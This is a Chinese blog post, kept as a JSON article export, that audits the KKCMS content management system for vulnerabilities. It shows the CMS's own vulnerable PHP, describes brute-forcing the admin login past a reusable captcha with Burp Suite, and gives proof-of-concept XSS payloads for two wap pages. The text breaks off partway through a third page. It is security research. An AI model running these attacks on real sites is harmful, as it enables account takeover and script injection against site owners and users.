{"title":"记一次较为详细的某CMS代码审计","uid":"2630421829e46cd019f16a83899a54d6","slug":"记一次较为详细的某CMS代码审计","date":"2022-06-08T09:35:30.000Z","updated":"2024-02-14T07:32:40.000Z","comments":true,"path":"api/articles/记一次较为详细的某CMS代码审计.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141523815.png","content":"<h1 id=\"声明\"><a href=\"#声明\" class=\"headerlink\" title=\"声明\"></a>声明</h1><p>文章首发于先知社区<a href=\"https://xz.aliyun.com/t/11714\">https://xz.aliyun.com/t/11714</a></p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>本次审计的话是Seay+昆仑镜进行漏洞扫描<br>Seay的话它可以很方便的查看各个文件，而昆仑镜可以很快且扫出更多的漏洞点，将这两者进行结合起来，就可以发挥更好的效果。<br>昆仑镜官方地址<br><a href=\"https://github.com/LoRexxar/Kunlun-M\">https://github.com/LoRexxar/Kunlun-M</a></p>\n<h1 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h1><h2 id=\"KKCMS环境搭建\"><a href=\"#KKCMS环境搭建\" class=\"headerlink\" title=\"KKCMS环境搭建\"></a>KKCMS环境搭建</h2><p>KKCMS链接如下<br><a href=\"https://github.com/liumengxiang/kkcms\">https://github.com/liumengxiang/kkcms</a><br>安装的话正常步骤就好，即</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、解压至phpstudy目录下\n<span class=\"token number\">2</span>、访问install\n<span class=\"token number\">3</span>、新建kkcms数据库，然后在安装的时候用这个数据库\n<span class=\"token number\">4</span>、安装完成，开始审计<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"目录结构\"><a href=\"#目录结构\" class=\"headerlink\" title=\"目录结构\"></a>目录结构</h2><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151196.png\" alt=\"在这里插入图片描述\"><br>常见的目录结构，简单了解一下其作用</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">admin 后台管理目录\ncss <span class=\"token constant\">CSS</span>样式表目录\ndata 系统处理数据相关目录\ninstall 网页安装目录\nimages 系统图片存放目录\ntemplate 模板\nsystem  管理目录<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h1><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151235.png\" alt=\"在这里插入图片描述\"><br>对扫描出的开始进行审计</p>\n<h2 id=\"验证码重用\"><a href=\"#验证码重用\" class=\"headerlink\" title=\"验证码重用\"></a>验证码重用</h2><h3 id=\"admin-cms-login-php\"><a href=\"#admin-cms-login-php\" class=\"headerlink\" title=\"admin/cms_login.php\"></a>admin/cms_login.php</h3><p>源码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'verifycode'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'verifycode'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">alert_href</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'验证码错误'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'cms_login.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">null_back</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'请输入用户名'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">null_back</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a_password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'请输入密码'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">null_back</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'verifycode'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'请输入验证码'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$a_name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$a_password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a_password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'select * from xtcms_manager where m_name = \"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$a_name</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" and m_password = \"'</span><span class=\"token operator\">.</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a_password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span> <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'admin_name'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'m_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'admin_password'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'m_password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'location:cms_welcome.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">alert_href</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'用户名或密码错误'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'cms_login.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>验证码的校验代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'verifycode'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'verifycode'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token function\">alert_href</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'验证码错误'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'cms_login.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>不难发现这里是将<code>$_SESSION[&#39;verifycode&#39;]</code>与POST上传的<code>verifycode</code>相比较,如果不相等就会刷新跳转，重新回到登录处，此时验证码也会被更新。<br>我们进入前端界面看一下<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151192.png\" alt=\"在这里插入图片描述\">发现验证码js对应处存在文件，跟进查看一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$image</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecreate</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$bcolor</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecolorallocate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$image</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$fcolor</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecolorallocate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$image</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'0123456789'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$rand_str</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$k</span> <span class=\"token operator\">=</span> <span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$rand_str</span> <span class=\"token operator\">.=</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$k</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'verifycode'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$rand_str</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">imagefill</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$image</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$bcolor</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">imagestring</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$image</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$rand_str</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$fcolor</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'content-type:image/png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">imagepng</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$image</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>该文件的含义是用<code>0-9</code>中的任意四个数字作为验证码，也就是说js引用该文件来产生验证码。这里学习过其他师傅的思路后，了解到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Burpsuite默认不解析js<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>因此我们这里就可以借助bp抓包，摒弃js，对用户名和密码进行爆破<br>抓包后发送到<code>instruct</code>模块，在密码处添加变量<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151184.png\" alt=\"在这里插入图片描述\"><br>而后添加一些常用的弱口令密码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151178.png\" alt=\"在这里插入图片描述\"><br>开始爆破<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151171.png\" alt=\"在这里插入图片描述\">成功爆破出密码</p>\n<h2 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h2><h3 id=\"wap-shang-php\"><a href=\"#wap-shang-php\" class=\"headerlink\" title=\"wap/shang.php\"></a>wap/shang.php</h3><p>使用昆仑镜进行扫描，得到结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151609.png\" alt=\"在这里插入图片描述\"><br>结合Seay，查看该文件代码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151647.png\" alt=\"在这里插入图片描述\"><br>可以看到直接输出了<code>$_GET[&#39;fee&#39;]</code>，因此我们这里直接传入一个xss语句尝试触发xss<br>payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">fee<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151669.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"wap-seacher-php\"><a href=\"#wap-seacher-php\" class=\"headerlink\" title=\"wap/seacher.php\"></a>wap/seacher.php</h3><p>昆仑镜扫描<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151683.png\" alt=\"在这里插入图片描述\"><br>利用seay查看源码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">//这只是一部分，具体的师傅们可自行查看此文件\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../data/cxini.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$link</span><span class=\"token operator\">=</span><span class=\"token variable\">$zwcx</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'zhanwai'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$q</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'wd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> html<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>html<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>head lang<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"en\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php  <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'head.php'</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>搜索<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$q</span><span class=\"token delimiter important\">?></span></span>-<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$xtcms_seoname</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>keywords<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$q</span><span class=\"token delimiter important\">?></span></span>,<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$xtcms_keywords</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>description<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$xtcms_description</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以发现这里这个变量<code>$q</code>直接被输出了，这个<code>$q</code>是<code>POST</code>上传的<code>wd</code>参数，因此我们这里POST上传wd参数，给它赋值一个xss语句的话，应该是可以进行XSS的，我们试着去构造一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">wp<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151750.png\" alt=\"在这里插入图片描述\"><br>成功触发XSS</p>\n<h3 id=\"wap-movie-php\"><a href=\"#wap-movie-php\" class=\"headerlink\" title=\"wap/movie.php\"></a>wap/movie.php</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">//部分源码\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'../system/list.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$page</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'page'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n$b=(strpos($_GET['m'],'rank='));\n$ye=substr($_GET['m'],$b+5);\n?>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$ye</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"rankhot\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'class=\"on\"'</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ye</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"createtime\"</span> <span class=\"token keyword\">or</span> <span class=\"token variable\">$ye</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"rankpoint\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'class=\"on\"'</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>?m=/dianying/list.php?rank=rankhot<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>最近热映<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span> \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span>  <span class=\"token attr-name\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$ye</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"createtime\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'class=\"on\"'</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>?m=/dianying/list.php?rank=createtime<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>最新上映<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>        \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span>  <span class=\"token attr-name\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$ye</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"rankpoint\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'class=\"on\"'</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>?m=/dianying/list.php?rank=rankpoint<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>最受好评<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">getPageHtml</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$fenye</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'movie.php?m='</span><span class=\"token operator\">.</span><span class=\"token variable\">$yourneed</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&amp;page='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>section</span><span class=\"token punctuation\">></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>  <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'footer.php'</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>存在可控参数<code>$_GET[&#39;m&#39;]</code>和<code>$_GET[&#39;page&#39;]</code>，开头引用了<code>inc.php</code>，试着找一下输出语句。<br>发现输出语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">getPageHtml</span><span 